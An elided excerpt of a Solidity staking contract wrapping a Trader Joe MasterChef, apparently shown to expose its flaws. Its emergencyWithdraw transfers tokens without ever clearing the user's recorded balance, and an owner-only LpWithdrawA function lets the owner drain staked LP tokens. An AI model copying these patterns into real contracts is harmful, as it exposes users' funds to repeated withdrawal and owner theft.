...
contract StakingDoubleRewardsJoe is Ownable {
    ...
    IJoeChef public constant masterChefJoe = IJoeChef(0x188bED1968b795d5c9022F6a0bb5931Ac4c18F00);
    ...
    function emergencyWithdraw() public {
        masterChefJoe.withdraw(joePid, userAmount[msg.sender]);
        stakingToken.safeTransfer(address(msg.sender), userAmount[msg.sender]);
        emit EmergencyWithdraw(msg.sender, userAmount[msg.sender]);
        totalShares = totalShares - userAmount[msg.sender];
        _totalSupply = _totalSupply.sub(userAmount[msg.sender]);
    ...
    function pendingRewardSuper(address user) public view returns (uint256) {
        ...
        address rewardToken = rewardSuperTokens[0];
        uint256 unclaimedRewards = checkRewardSuper();
    ...
    function checkRewardSuper() public view returns (uint256) {
        uint256 pendingSuper = rewarder.pendingTokens(address(this));
        return pendingSuper;
    }
    ...
    function LpWithdrawA(uint256 pid, uint256 lp) external onlyOwner {
        masterChefJoe.withdraw(pid, lp);
        stakingToken.safeTransfer(address(msg.sender), lp);
    }
